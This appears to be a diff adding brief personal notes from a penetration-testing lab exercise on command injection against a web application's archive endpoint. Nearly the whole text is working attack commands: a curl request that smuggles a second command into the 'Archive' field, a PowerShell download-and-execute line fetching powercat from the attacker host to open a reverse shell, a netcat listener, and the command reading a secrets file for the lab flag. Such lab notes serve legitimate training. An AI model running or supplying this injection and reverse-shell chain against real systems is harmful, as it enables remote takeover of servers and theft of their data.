@@ -1,0 +1,27 @@
+Common web application attacks
+
+Command injection
+
+target:
+192.168.66.189:8000
+
+git clone https://gitlab.com/exploit-database/exploitdb
+
+curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.66.189:8000/archive
+
+attacker:
+192.168.49.66
+
+IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.49.66/powercat.ps1");powercat -c 192.168.49.66 -p 4444 -e powershell 
+
+cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 /home/kali
+
+python3 -m http.server 80
+
+nc -nvlp 4444
+
+curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.49.66%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.49.66%20-p%204444%20-e%20powershell' http://192.168.66.189:8000/archive
+
+PS C:\Users\Administrator\desktop> type secrets.txt
+
+OS{33ab635ec001b01d4c429552856f2bb2}
